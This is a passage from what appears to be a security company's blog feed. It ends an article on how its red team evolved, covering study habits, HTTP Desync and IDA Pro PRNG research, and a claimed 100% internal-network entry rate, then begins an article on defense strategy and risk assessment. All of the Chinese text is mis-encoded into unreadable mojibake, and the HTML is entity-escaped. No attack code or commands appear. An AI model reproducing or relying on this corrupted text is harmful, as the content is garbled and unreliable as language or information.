&lt;p&gt;é—œæ–¼æƒ³åƒåŠ›ï¼Œå…¶å¯¦é‚„æœ‰ä¸€å€‹éš±è—çš„å‰æï¼šåŸºç¤åŠŸè¦å¤ ã€‚æˆ‘ä¸€ç›´èªç‚ºæƒ³åƒåŠ›æ˜¯çŸ¥è­˜çš„æ’åˆ—çµ„åˆï¼Œä¾‹å¦‚å‰›å‰›çš„å…©å€‹ä¾‹å­ï¼Œå¦‚æœä¸çŸ¥é“ Perl èªæ³•ç‰¹æ€§å’Œ Meta-Programming çš„çŸ¥è­˜ï¼Œå†æ€éº¼å¤©é¦¬è¡Œç©ºéƒ½æ˜¯ä¸å¯èƒ½æˆåŠŸ RCE çš„ã€‚æœ‰åŸºç¤åŠŸå†åŠ ä¸Šå‹‡æ–¼è¯æƒ³å’Œå˜—è©¦ï¼Œçµ•å°æ˜¯ä¸€å€‹ç´…éšŠå¤§å°‡çš„å¿…å‚™ç‰¹è³ªã€‚è‡³æ–¼åŸºç¤åŠŸéœ€è¦åˆ°ä»€éº¼ç¨‹åº¦ï¼Œå°æˆ‘å€‘ä¾†èªªï¼Œè¬›åˆ°ä¸€å€‹æ¼æ´ï¼Œå¿ƒä¸­å°±æœƒåŒæ™‚è·³å‡ºä¸€å€‹æ¨¹ç‹€åœ–ï¼šå‡ºç¾æˆå› æ˜¯ä»€éº¼ï¼Ÿç›¸é—œçš„æ¡ˆä¾‹ã€æ¼æ´ã€ç¹éæ–¹å¼éƒ½æœƒå•µå•µå•µè·³å‡ºä¾†ï¼Œèƒ½åšåˆ°é€™æ¨£æˆ‘æƒ³å°±å·²ç¶“æ˜¯æœ‰æ‰€å°æˆäº†ã€‚&lt;/p&gt;

&lt;h3 id=&quot;è¿½æ–°æŠ€è¡“&quot;&gt;è¿½æ–°æŠ€è¡“&lt;/h3&gt;

&lt;p&gt;æœƒè¿½æ–°æŠ€è¡“é€™ä»¶äº‹æƒ…ï¼Œä¼¼ä¹æ˜¯è³‡å®‰åœˆçš„æ¨™é…ï¼Œæˆ‘å€‘çš„ä¸–ç•Œä¸åªæœ‰ OWASP TOP 10ã€‚æ›´ç¾å¯¦çš„èªªæ³•æ˜¯ï¼Œå¦‚æœåªé é€™éº¼ä¸€é»çŸ¥è­˜ï¼Œåœ¨ç´…éšŠæ¼”ç·´èƒ½ç™¼æ®çš„æ•ˆæœå…¶å¯¦ä¸¦ä¸å¤§ã€‚åˆ†äº«ä¸€ä¸‹æˆ‘çœ‹åˆ°æˆå“¡å€‘çš„æ¨£å­ï¼Œå°æ–¼ä»–å€‘ä¾†èªªï¼Œçœ‹æ–°æŠ€è¡“æ˜¯æ¯å¤©çš„ç¿’æ…£ï¼Œå¦‚æœæœ‰è³‡å®‰ç ”è¨æœƒæŠ•å½±ç‰‡é‡‹å‡ºï¼Œæœƒè¿½ã€‚æ–°æŠ€è¡“è£¡æœ‰èˆˆè¶£çš„ï¼Œæœƒå‹•æ‰‹ç©ï¼Œç”šè‡³å¯«æˆå·¥å…·ï¼Œæˆ‘å€‘å¾ˆå¤šå…§éƒ¨å·¥å…·éƒ½æ˜¯é€™æ¨£é»˜é»˜è£œå¼·çš„ã€‚é‚„æœ‰ä¸€é»ï¼Œçœ‹æ–°æŠ€è¡“æœ€çµ‚ç›®çš„å°±æ˜¯è¦æ´»ç”¨ï¼Œæ‹¿æ–°æŠ€è¡“è§£æ±ºèˆŠå•é¡Œï¼Œå¾€å¾€æœ‰æ©Ÿæœƒç™¼ç¾ä¸€äº›çªç ´æ–¹å¼ã€‚ä¾‹å¦‚æˆ‘å€‘åœ¨ä»Šå¹´å…«æœˆ BlackHat ç ”è¨æœƒçœ‹åˆ°äº† &lt;a href=&quot;https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn&quot;&gt;HTTP Desync&lt;/a&gt; çš„æ”»æ“Šæ–¹å¼ï¼Œå›åœ‹ä¹‹å¾Œé¦¬ä¸Šå°±æŠŠé€™å€‹çŸ¥è­˜ç”¨åœ¨ç•¶æ™‚çš„å°ˆæ¡ˆä¸Šï¼Œè®“æˆ‘å€‘å¤šäº†ä¸€äº›æ”»æ“Šé¢å‘ï¼ï¼ˆé€™å€‹æ‰‹æ³•æŒºæœ‰è¶£çš„ï¼Œåœ¨æˆ‘å€‘æ±¡æŸ“ä¼ºæœå™¨å¾Œï¼Œéš¨æ©Ÿä¸€å€‹äººç€è¦½å®¢æˆ¶ç¶²é å°±æœƒåŸ·è¡Œæˆ‘å€‘çš„ JavaScriptï¼Œä¸éœ€è¦ä»€éº¼ç‰¹æ®Šæ¢ä»¶ï¼Œæœ‰èˆˆè¶£å¯ä»¥ç ”ç©¶ä¸€ä¸‹:p ï¼‰&lt;/p&gt;

&lt;h3 id=&quot;ç›¸ä¿¡ä»¥åŠå …æŒ&quot;&gt;ç›¸ä¿¡â€¦ä»¥åŠå …æŒ&lt;/h3&gt;

&lt;p&gt;æœ€å¾Œä¸€é»ï¼Œæˆ‘æƒ³åˆ†äº«çš„æ˜¯ï¼šåœ¨ç ”ç©¶æˆ–è€…æ¸¬è©¦çš„éç¨‹ç•¶ä¸­ï¼Œæœ‰æ™‚å€™æœƒèŠ±è²»å¾ˆå¤šæ™‚é–“å»æ²’æœ‰æˆæœï¼Œä½†æ˜¯å¦‚æœä½ è©•ä¼°æ˜¯æœ‰æ©Ÿæœƒï¼Œé‚£å°±ç›¸ä¿¡è‡ªå·±ï¼ŒèŠ±æ™‚é–“åšä¸‹å»å§ï¼&lt;br /&gt;
æˆ‘å€‘æœ‰ä¸€å€‹èŠ±è²»ä¸€å€‹æœˆçš„ä¾‹å­ï¼Œæ˜¯ä¹‹å‰&lt;a href=&quot;https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way/&quot;&gt;ç ´è§£ IDA Pro å½éš¨æ©Ÿæ•¸&lt;/a&gt;çš„ç ”ç©¶ï¼Œé€™å€‹äº‹ä»¶æ„å¤–åœ¨ binary åœˆå¾ˆæœ‰åï¼Œç”šè‡³é‚„æœ‰äººå¯«æˆ&lt;a href=&quot;https://medium.com/the-singularity-is-near/recent-leak-of-ida-pro-7-2-a-brief-timeline-4c1dcbe6331e&quot;&gt;äº‹ä»¶æ‡¶äººåŒ…&lt;/a&gt;ã€‚é€™å€‹ç ”ç©¶æ˜¯åœ¨æ¢è¨å¦‚æœæˆ‘å€‘æ²’æœ‰å®‰è£å¯†ç¢¼ï¼Œæœ‰æ©Ÿæœƒå®‰è£ IDA PRO å—ï¼Ÿçµæœæœ€å¾Œæˆ‘å€‘æƒ³è¾¦æ³•é€†æ¨å‡ºäº† IDA å¯†ç¢¼ç”¢ç”Ÿå™¨çš„ç®—æ³•ï¼ŒçŸ¥é“å½éš¨æ©Ÿæ•¸ä½¿ç”¨äº†å“ªäº›å­—å…ƒï¼Œå’Œå®ƒçš„æ­£ç¢ºæ’åºã€‚é€™ä»¶äº‹æƒ…çš„é›£åº¦å·²ç¶“ä¸åªåœ¨æŠ€è¡“ä¸Šï¼Œè€Œåœ¨æ–¼è¦çŒœå‡ºå½éš¨æ©Ÿæ•¸ä½¿ç”¨çš„å­—å…ƒé›†é †åºï¼Œé‚„è¦åŒæ™‚çŒœå‡ºå°æ–¹ä½¿ç”¨çš„æ¼”ç®—æ³•ï¼ˆè‡³å°‘æœ‰88ç¨®ï¼‰ã€‚è€Œä¸”æˆ‘å€‘æ¯é©—è­‰ä¸€ç¨®æ’åˆ—çµ„åˆï¼Œå°±æœƒèŠ±åŠå¤©æ™‚é–“å’Œ 100GB çš„ç©ºé–“ï¼Œç´¯ç©æˆæœ¬æ»¿é«˜çš„ã€‚ä½†æˆ‘å€‘æ ¹æ“šç¶“é©—ç›¸ä¿¡é€™æ˜¯æœ‰æ©ŸæœƒæˆåŠŸçš„ï¼Œä¸¦ä¸”æŠ•æ³¨è³‡æºå …æŒä¸‹å»ï¼Œæœ€å¾Œæœ‰äº†å¾ˆä¸éŒ¯çš„æˆæœã€‚&lt;/p&gt;

&lt;p&gt;é€™è£¡ä¸æ˜¯åœ¨é¼“å‹µä¸€æ„å­¤è¡Œï¼Œè€Œæ˜¯ä¸€ç¨®å¿ƒç†ç´ è³ªï¼šæ˜¯åœ¨é¢è‡¨å¡é—œçš„æ™‚å€™ï¼Œæœ‰è¶³å¤ çš„åˆ¤æ–·åŠ›ï¼Œæ–¹å‘éŒ¯èª¤èƒ½æœæ–·æ”¾æ£„ï¼Œå¦‚æœæ–¹å‘æ­£ç¢ºè¦æœ‰å …æŒä¸‹å»çš„å‹‡æ°£ã€‚&lt;/p&gt;

&lt;h2 id=&quot;è³‡å®‰é˜²è­·è¶¨å‹¢èˆ‡ç´…éšŠçš„ä¸‹ä¸€æ­¥&quot;&gt;è³‡å®‰é˜²è­·è¶¨å‹¢èˆ‡ç´…éšŠçš„ä¸‹ä¸€æ­¥&lt;/h2&gt;

&lt;p&gt;æ–‡ç« çš„æœ€å¾Œä¸€éƒ¨åˆ†è¦è«‡çš„æ˜¯ç´…éšŠæ¼”ç·´çš„æœªä¾†ï¼Œä¹Ÿæ˜¯é€™ç¯‡æ–‡ç« çš„é‡é»ï¼Œæœªä¾†ï¼Œæˆ‘å€‘å¸Œæœ›å¯ä»¥è§£æ±ºä»€éº¼å•é¡Œï¼Ÿ&lt;/p&gt;

&lt;p&gt;åšç‚ºç´…éšŠæ¼”ç·´çš„é ˜å°å» å•†ï¼Œå¾ 2017 å¹´æ¼”ç·´åˆ°ç¾åœ¨æˆ‘å€‘é€²å…¥å°ç£ä¼æ¥­å…§ç¶²çš„æˆåŠŸç‡æ˜¯ 100%ã€‚æˆ‘å€‘åœ¨è¶…éå…­æˆçš„æ¼”ç·´æ¡ˆä¸­æ‹¿åˆ° AD ç®¡ç†æ¬Šé™ï¼Œé€™é‚„ä¸å«é‚£äº›ä¸æ˜¯ç”¨ AD ä¾†ç®¡ç†çš„ä¼æ¥­ã€‚æˆ‘å€‘ç™¼ç¾é€²å…¥å…§ç¶²å¾Œï¼Œé€šå¸¸ä¸æœƒæœ‰ä»€éº¼é˜»ç¤™ï¼Œå°±å¥½åƒè®Šæˆå…§éƒ¨å“¡å·¥ï¼Œæ‰“äº†è²æ‹›å‘¼å°±å¯ä»¥é€²æ©Ÿæˆ¿ã€‚æƒ³è¦æé†’å¤§å®¶çš„æ˜¯ï¼šå°é ‚å°–æ”»æ“Šåœ˜éšŠè€Œè¨€ï¼Œé€²å…¥ä¼æ¥­å…§ç¶²çš„é›£åº¦ä¸¦ä¸é«˜ã€‚å¦‚æœç¢°ä¸Šé ‚å°–çš„é§­å®¢ï¼Œæˆ–æ˜¯ä¸€å€‹ 0dayï¼Œä¼æ¥­æº–å‚™å¥½äº†å—ï¼Ÿé€™å°±æ˜¯ç¾éšæ®µæˆ‘å€‘æ‰€ç™¼ç¾çš„å•é¡Œï¼&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191024/4.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨èªªåˆ°æŠµç¦¦æ”»æ“Šé€šå¸¸æœƒæœ‰ä¸‰å€‹é¢å‘ï¼Œåˆ†åˆ¥æ˜¯ã€Œé é˜²ã€ã€ã€Œåµæ¸¬ã€å’Œã€Œå›æ‡‰ã€ã€‚ä¸€èˆ¬è€Œè¨€ä¼æ¥­åœ¨ã€Œé é˜²ã€é€™éƒ¨ä»½åšçš„æ¯”è¼ƒå®Œå–„ï¼Œå°æ–¼å·²çŸ¥çš„å¼±é»éƒ½æœ‰æ¯”è¼ƒé«˜çš„æŒæ¡åº¦ã€‚ä»Šå¤©æ™®éçš„å•é¡Œåœ¨ã€Œ&lt;strong&gt;åµæ¸¬&lt;/strong&gt;ã€å’Œã€Œ&lt;strong&gt;å›æ‡‰&lt;/strong&gt;ã€ä¸Šï¼Œä¼æ¥­èƒ½ä¸èƒ½ç™¼ç¾æœ‰äººåœ¨å°ä½ é€²è¡Œæ”»æ“Šï¼Ÿæˆ–æ˜¯çŸ¥é“è¢«æ”»æ“Šå¾Œæœ‰æ²’æœ‰èƒ½åŠ›å³æ™‚å›æ‡‰ä¸¦ä¸”æ ¹çµ•æºé ­ï¼Ÿé€™å…©ä»¶äº‹æƒ…åšå¾—ç›¸å°ä¸å¥½çš„åŸå› ä¸¦ä¸æ˜¯ä¼æ¥­æ²’æœ‰æŠ•å…¥è³‡æºåœ¨ä¸Šé¢ï¼Œè€Œæ˜¯å°æ–¼ä¼æ¥­ä¾†èªªå¤ªé›£é©—è­‰ï¼Œå¾ˆé›£æœ‰å€‹æ¨™æº–å»ç¢ºå®šç›®å‰çš„æ©Ÿåˆ¶æœ‰æ²’æœ‰æ•ˆæˆ–æ˜¯è²·äº†è¨­å‚™æœ‰æ²’æœ‰ä½œç”¨ï¼Œå°±ç®—æœ‰è—éšŠé€šå¸¸ä¹Ÿæ²’æœ‰å»ºç«‹å®Œå–„çš„æ‡‰å° SOPï¼Œç•¢ç«Ÿé§­å®¢å…¥ä¾µä¸æœƒæ˜¯å¤©å¤©ç™¼ç”Ÿçš„äº‹æƒ…ã€‚&lt;/p&gt;

&lt;p&gt;æ‰€ä»¥ï¼Œæˆ‘å€‘å¸Œæœ›ä¼æ¥­èƒ½å¾ç´…éšŠæ¼”ç·´ä¸­ï¼Œè¨“ç·´å°æ”»æ“Šäº‹ä»¶çš„åµæ¸¬å’Œåæ‡‰èƒ½åŠ›ã€‚æˆ–æ˜¯èªªï¼Œç´…éšŠæ¼”ç·´çš„æœ¬è³ªå°±æ˜¯åœ¨çœŸå¯¦çš„æ¼”ç·´ï¼Œé€éæ”»é˜²å¹«åŠ©ä¼æ¥­äº†è§£è‡ªå·±çš„å¼±é …ã€‚éå»å°ç£çš„ç´…éšŠæœå‹™éƒ½æœƒå¼·èª¿åœ¨æ‰¾å‡ºæ•´å€‹ä¼æ¥­çš„å¼±é»ï¼Œæ‰¾å‡ºæ¼æ´å›ºç„¶é‡è¦ï¼Œä½†ç¢°åˆ°åƒæˆ‘å€‘ä¸€æ¨£å¾ˆå¸¸æ‰¾åˆ° 0-day çš„çµ„ç¹”ï¼Œæœ‰åµæ¸¬å’Œå›æ‡‰èƒ½åŠ›æ‰æ˜¯æœ€å¾Œèƒ½æ•‘ä½ ä¸€å‘½çš„ç¡¬æŠ€èƒ½ã€‚æ›å€‹è§’åº¦ä¾†çœ‹ï¼Œç›®å‰ä¸–ç•Œä¸Šæœ€å®Œæ•´çš„æ”»æ“Šæˆ°ç•¥å’ŒæŠ€è¡“æ‰‹æ³•åˆ—è¡¨æ˜¯ &lt;a href=&quot;https://attack.mitre.org/&quot;&gt;MITRE ATT&amp;amp;CK Framework&lt;/a&gt;ï¼Œä¸€å€‹å°ä¼æ¥­æœ‰å‚·å®³çš„æ”»æ“Šè¡Œå‹•é€šå¸¸æœƒæ˜¯å¾ˆå¤šå€‹æ”»æ“Šæ‰‹æ³•æ‰€çµ„æˆçš„æ”»æ“Šéˆï¼Œè€Œåœ¨é€™å€‹ Framework ä¸­ï¼Œæ‰¾åˆ°èµ·å§‹å¼±é»é€™ä»¶äº‹æƒ…åƒ…ä½”äº†æ•´å€‹æ”»æ“Šéˆä¸åˆ°ä¸€æˆï¼Œä¼æ¥­å¦‚æœèƒ½å¤ æŠ•æ³¨åœ¨å…¶ä»–ä¹æˆæ‰‹æ³•çš„åµæ¸¬èƒ½åŠ›ä¸Šä¸¦é˜»æ–·å…¶ä¸­ä»»ä¸€ç’°ç¯€ï¼Œå°±æœ‰æ©Ÿæœƒè®“æ•´å€‹æ”»æ“Šè¡Œå‹•å¤±æ•—è€Œä¿è­·åˆ°è³‡ç”¢ã€‚&lt;/p&gt;

&lt;p&gt;è¦èªªçš„æ˜¯ï¼Œæˆ‘å€‘ç´…éšŠæ¼”ç·´é™¤äº†æ‰¾å‡ºä¼æ¥­æ¼æ´èƒ½åŠ›é ‚å°–ä¹‹å¤–ï¼Œä¹Ÿç´¯ç©äº†å¾ˆè±å¯Œçš„å…§ç¶²æ»²é€ç¶“é©—åŠæŠ€å·§ï¼Œæˆ‘å€‘å¾ˆæ¨‚æ„é€éæ¼”ç·´å”åŠ©ä¼æ¥­åŠ å¼·çœŸå¯¦çš„åµæ¸¬å’Œå›æ‡‰èƒ½åŠ›ã€‚æ¼¸æ¼¸çš„ï¼Œæœªä¾†ç´…éšŠæœƒæ…¢æ…¢è‘—é‡åœ¨å’Œè—éšŠçš„æ”»é˜²æ¼”ç·´ã€‚æœƒå¼·èª¿æ“¬å®šæˆ°ç•¥ï¼Œè®“ä¼æ¥­äº†è§£è‡ªå·±å°å“ªäº›æ”»æ“Šçš„é˜²ç¦¦èƒ½åŠ›æ¯”è¼ƒå¼±ï¼Œé€²è€Œå»æ”¹å–„ã€‚æœªä¾†çš„ç´…éšŠä¹Ÿæ›´éœ€è¦å¼·èª¿èˆ‡é˜²ç¦¦æ©Ÿåˆ¶äº¤æ‰‹çš„ç¶“é©—ï¼Œäº†è§£é˜²ç¦¦çš„æ¥µé™ï¼Œæ‰æœ‰è¾¦æ³•æ‰¾åˆ°è¨­å‚™è¨­å®šä¸å…¨æˆ–æ˜¯æ¶µè“‹ç‡ä¸è¶³çš„ç›²é»ã€‚&lt;/p&gt;

&lt;p&gt;æœ€å¾Œæˆ‘å€‘ä¹Ÿæœ‰äº›è¦åŠƒå»ºè­°çµ¦å°è³‡å®‰é˜²ç¦¦æ¯”è¼ƒæˆç†Ÿçš„ä¼æ¥­å¦‚ä¸‹ï¼Œé€æ­¥è½å¯¦å¯ä»¥å°‡è³‡å®‰é«”è³ªææ˜‡ä¸€å€‹å±¤æ¬¡ã€‚ï¼ˆè‡³å°‘å¾æˆ‘å€‘çš„ç¶“é©—ä¾†çœ‹ï¼Œæœ‰é€™äº›æ¦‚å¿µçš„ä¼æ¥­éƒ½æ˜¯ç‰¹åˆ¥é›£æ”»æ“Šé”æˆç›®æ¨™çš„ï¼‰&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å¦‚æœå¤–ç¶²å®‰å…¨å·²æŠ•è³‡å¤šå¹´ï¼Œé–‹å§‹æ€è€ƒã€Œ&lt;strong&gt;å¦‚æœé§­å®¢å·²ç¶“åœ¨å…§ç¶²&lt;/strong&gt;ã€çš„é˜²ç¦¦ç­–ç•¥&lt;/li&gt;
  &lt;li&gt;ç›¤é»å‡ºæœ€ä¸å¯ä»¥è¢«æ´©æ¼çš„é‡è¦è³‡æ–™ï¼Œå¾é€™äº›åœ°æ–¹é–‹å§‹å¥‰è¡Œ &lt;strong&gt;Zero Trust&lt;/strong&gt; æ¦‚å¿µ&lt;/li&gt;
  &lt;li&gt;ä¼æ¥­å…§éƒ¨éœ€è¦æœ‰å°ˆè·è³‡å®‰äººå“¡ç·¨åˆ¶ï¼ˆè—éšŠï¼‰&lt;/li&gt;
  &lt;li&gt;é€éèˆ‡æœ‰ç¶“é©—çš„ç´…éšŠåˆä½œï¼Œå…¨ç›¤æª¢è¦–é˜²ç¦¦ç›²é»&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;å¾Œè¨˜&quot;&gt;å¾Œè¨˜&lt;/h2&gt;

&lt;p&gt;ç ”è¨æœƒå…§å®¹åˆ°é€™é‚Šå°±çµæŸäº†ã€‚å¯«åœ¨æœ€å¾Œçš„æœ€å¾Œï¼Œæ˜¯å……æ»¿è‘—æ„Ÿè¬ã€‚å…¶å¯¦ç„¡è«–æ»²é€æ¸¬è©¦é‚„æ˜¯ç´…éšŠæ¼”ç·´ï¼Œåœ¨ä¸€é–‹å§‹éƒ½ä¸æ˜¯äººäººå¯ä»¥æ¥å—çš„ï¼Œè€Œæ¸¬è©¦çš„åƒ¹å€¼ä¹Ÿä¸æ˜¯æˆ‘å€‘èªªäº†ç®—ã€‚ä¸€è·¯èµ°ä¾†ï¼Œæ¼¸æ¼¸æ¼¸æ¼¸æ„Ÿå—åˆ°é–‹å§‹æœ‰äººç›¸ä¿¡æˆ‘å€‘ï¼Œå¾æ—©æœŸæ¯”è¼ƒå¤šæ¸¬è©¦æ™‚èˆ‡å·¥ç¨‹å¸«å’Œç¶²ç®¡äººå“¡çš„å°ç«‹ï¼Œåˆ°è¿‘æœŸè¶Šä¾†è¶Šå¤š open mindã€å°±æ˜¯æƒ³æ‰¾å‡ºå•é¡Œçš„å®¢æˆ¶ï¼Œæ˜¯æ»¿å¤§çš„å°æ¯”ã€‚éå¸¸æ„Ÿè¬ä»–å€‘çš„ä¿¡ä»»ï¼Œä¹Ÿå› ç‚ºé€™æ¨£çš„äº’ä¿¡ï¼Œæˆ‘å€‘å¾—ä»¥ç¯€çœæ™‚é–“å®Œæˆæ›´æ£’çš„ç”¢å‡ºã€‚æ»¿æ¨‚è¦‹å°ç£è³‡è¨Šç”¢æ¥­æ˜¯é€™æ¨£æ­£å‘é¢å°å•é¡Œï¼Œæ¼æ´å­˜åœ¨å°±æ˜¯å­˜åœ¨ï¼Œä¸æœƒå› ç‚ºè¦–è€Œä¸è¦‹è€ŒçœŸçš„ä¸è¦‹ï¼Œæ„è­˜åˆ°æœ‰å•é¡Œè§£æ±ºäº†å°±å¥½ã€‚æ‰€ä»¥æˆ‘åœ¨æ¼”è¬›æœ€å¾Œç•™ä¸‹é€™æ¨£ä¸€å¥ï¼šã€&lt;strong&gt;ç´…éšŠæ¼”ç·´çš„ç²¾é«“ä¸æ˜¯åœ¨å‘Šè¨´ä½ æœ‰å¤šè„†å¼±ï¼Œåœ¨æ–¼çœŸæ­£å£äººé—–å…¥æ™‚ä½ å¯ä»¥ç¨ç•¶ä¸€é¢æ“‹ä¸‹&lt;/strong&gt;ã€ï¼Œå¸Œæœ›è¶Šä¾†è¶Šå¤šäººèƒ½æ­£é¢å°å¾…å•é¡Œï¼ŒåŒæ™‚ä¹Ÿå‚³éæˆ‘å€‘æƒ³è¦åšåˆ°çš„åƒ¹å€¼ã€‚&lt;/p&gt;

&lt;p&gt;2019 DEVCORE CONFï¼Œè¬è¬éå»åˆä½œçš„æœ‹å‹å€‘åƒèˆ‡è®“ DEVCORE ç´…éšŠå¾—ä»¥é€²åŒ–ï¼Œå¸Œæœ›ä¸‹ä¸€æ­¥ä¹Ÿèƒ½æœ‰ä½ ï¼Œæˆ‘å€‘æ˜å¹´è¦‹ :)&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2019/10/24/evolution-of-DEVCORE-red-team-and-the-next/</link>
                <guid>https://devco.re/blog/2019/10/24/evolution-of-DEVCORE-red-team-and-the-next</guid>
                <pubDate>Thu, 24 Oct 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>ä»¥æ”»æ“Šè€…çš„è§’åº¦åˆ¶å®šé˜²ç¦¦ç­–ç•¥</title>
                <description>&lt;style type=&quot;text/css&quot;&gt;
    table {
        display: block;
        width: 100%;
        overflow: auto;
        word-break: normal;
        word-break: keep-all;
        font-size: smaller;
    }

    table th {
        font-weight: bold
    }

    table th,
    table td {
        padding: 5px 11px;
        border: 1px solid #ddd;
    }

    table tr {
        background-color: #fff;
        border-top: 1px solid #ccc;
    }

    table tr:nth-child(2n) {
        background-color: #f8f8f8;
    }
&lt;/style&gt;

&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h2&gt;
&lt;p&gt;é€™ç¯‡æ–‡ç« æºè‡ªæ–¼å…¬å¸ä»Šå¹´ç¬¬ä¸€æ¬¡è©¦è¾¦çš„ç ”è¨æœƒ &lt;a href=&quot;https://devco.re/conf/2019/&quot;&gt;DEVCORE Conference 2019&lt;/a&gt;ï¼Œæˆ‘å€‘æ±ºå®šå¦å¤–å¯«æˆ blog åˆ†äº«å‡ºä¾†ï¼Œè®“ç„¡æ³•åƒåŠ çš„æœ‹å‹ä¹Ÿå¯ä»¥å¾ä¸åŒè§’åº¦é‡æ–°æ€è€ƒé˜²ç¦¦ç­–ç•¥ã€‚&lt;/p&gt;

&lt;p&gt;æœƒæƒ³åœ¨ç´”æŠ€è¡“å°å‘çš„ç ”è¨æœƒä¸­åŠ å…¥ç­–ç•¥é¢çš„è­°é¡Œï¼Œå…¶å¯¦è·Ÿä»Šå¹´ç ”è¨æœƒçš„ä¸»è»¸ã€Œ&lt;strong&gt;å¾ç­–ç•¥æ“¬å®šæ§åˆ¶ï¼Œå¾æ§åˆ¶åæ˜ æ„è­˜&lt;/strong&gt;ã€æœ‰é—œã€‚å¦‚æœä¼æ¥­ç¼ºä¹é•·é æ­£ç¢ºçš„è³‡å®‰ç­–ç•¥ï¼Œé™¤äº†æŠ•å…¥çš„è³‡æºç„¡æ³•é”åˆ°ä¼æ¥­é æœŸçš„æ•ˆç›Šã€ä¸€ç·šè³‡å®‰äººå“¡ç–²æ–¼å¥”å‘½å¤–ï¼Œç®¡ç†éšå±¤åœ¨è³‡è¨Šä¸å°ç¨±çš„æƒ…æ³ä¸‹èªç‚ºæŠ•å…¥çš„è³‡æºå·²ç¶“è¶³å¤ å®‰å…¨ï¼Œæœ€çµ‚å½¢æˆæƒ¡æ€§å¾ªç’°ï¼Œåªèƒ½åœ¨æ¯æ¬¡è³‡å®‰äº‹æ•…å¾Œè·Ÿè‘—æ™‚ä¸‹æµè¡Œé¸æ“‡æœ€å¤¯è³‡å®‰çš„ç”¢å“ã€‚&lt;/p&gt;

&lt;h2 id=&quot;ç†æƒ³ä¸­çš„é˜²ç¦¦ç­–ç•¥&quot;&gt;ç†æƒ³ä¸­çš„é˜²ç¦¦ç­–ç•¥&lt;/h2&gt;
&lt;p&gt;è€Œæœ€å»£ç‚ºäººçŸ¥çš„é˜²ç¦¦ç­–ç•¥å¯èƒ½æ˜¯ç¸±æ·±é˜²ç¦¦ï¼Œä»¥ä¸åŒé¡å‹çš„æ§åˆ¶æªæ–½ (è¨­å‚™ã€åˆ¶åº¦ã€æœå‹™) æ¸›å°‘æ•µäººå…¥ä¾µçš„å¯èƒ½æ€§ã€å„˜é‡æ¸›å°‘å–®ä¸€æ§åˆ¶æªæ–½å¤±æ•ˆé€ æˆçš„é¢¨éšªã€‚ç„¶è€Œï¼Œé€™å€‹æ¦‚å¿µæœ‰å¹¾å€‹éœ€è¦æ€è€ƒçš„é‡é»&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;é˜²è­·é‚Šç•Œé å¤§æ–¼ä¼æ¥­çš„æƒ³åƒï¼šå°è‡´ç„¡æ³•æŒæ¡ä¼æ¥­å¯èƒ½çš„å…¥ä¾µé»ã€‚&lt;/li&gt;
  &lt;li&gt;å°è³‡å®‰è¨­å‚™èªçŸ¥éŒ¯èª¤ï¼šé€™è®“æ•µäººå¯ä»¥ç¹éè³‡å®‰è¨­å‚™ï¼Œæˆ–æ˜¯è¨­å‚™æ²’æœ‰ç™¼æ®ä¼æ¥­é æœŸçš„æ•ˆç”¨ã€‚&lt;/li&gt;
  &lt;li&gt;ç®¡ç†ç¨‹åºä¸å¤ è½å¯¦ï¼šå°è‡´æ§åˆ¶æªæ–½ç”¢ç”Ÿæ–°çš„æ¼æ´ï¼Œè­¬å¦‚é è¨­å¯†ç¢¼æ²’æœ‰æ›´æ”¹ï¼Œå°è‡´ VPN æˆ–ç¶²è·¯è¨­å‚™å¯ä»¥ç›´æ¥è¢«å­˜å–ã€‚&lt;/li&gt;
  &lt;li&gt;å¿½è¦–é‡è¦è³‡ç”¢ç›¸é—œæ€§ï¼šåªå°‡é˜²ç¦¦è³‡æºæŠ•æ³¨åœ¨é‡è¦è³‡ç”¢æœ¬èº«ï¼Œè€Œè¼•å¿½èˆ‡å…¶ç›¸é€£çš„è³‡ç”¢ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;é€™ä¸€é€£ä¸²çš„ç–å¿½ï¼Œå¯èƒ½æˆç‚ºæ”»æ“Šè€…å…¥ä¾µçš„è·¯å¾‘ï¼Œå°±æ˜¯æ‰€è¬‚çš„ç‘å£«èµ·å¸æ¨¡å‹ ï¼ˆSwiss Cheese Model)ï¼Œå› æ­¤ä¼æ¥­æœŸæœ›é€éé¢¨éšªè©•é‘‘ (Risk Assessment) ä¾†ç›¤é»å‡ºå¯èƒ½çš„ç–å¤±ï¼Œä¸¦ä¸”åœ¨æ¬Šè¡¡è³‡æºä¸‹ï¼Œç¢ºä¿å°‡é‡å¿ƒæ”¾åœ¨é«˜é¢¨éšªéœ€è¦å„ªå…ˆè™•ç†çš„é …ç›®ã€‚&lt;/p&gt;

&lt;p&gt;ä½†æˆ‘å€‘æƒ³èŠèŠé€™å€‹å·¥å…·åœ¨å¯¦å‹™ä¸Šæœ‰å®ƒé›£ä»¥å®Œå–„ä¹‹è™•ï¼Œä»¥åŠå¾æ”»æ“Šè€…çš„è§’åº¦æ˜¯æ€æ¨£çœ‹å¾…é€™å€‹æ“¬è¨‚é˜²ç¦¦ç­–ç•¥æ ¸å¿ƒå·¥å…·ï¼Œæˆ‘å€‘æœƒé‡å°ä¸€ä¸‹è­°é¡Œä¾åºèªªæ˜&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;çœŸå¯¦é¢¨éšªå…¶å¯¦è¤‡é›œçš„é›£ä»¥è©•ä¼°&lt;/li&gt;
  &lt;li&gt;ç¾è¡Œé¢¨éšªè©•é‘‘æ–¹å¼å¯èƒ½çš„åå·®&lt;/li&gt;
  &lt;li&gt;å¾æ”»æ“Šè€…çš„è§’åº¦æ”¹å–„é¢¨éšªè©•é‘‘&lt;/li&gt;
  &lt;li&gt;æŒ‘é¸é©åˆçš„æ–¹æ³•æ”¹å–„é¢¨éšªè©•é‘‘&lt;/li&gt;
&lt;/ul&gt;

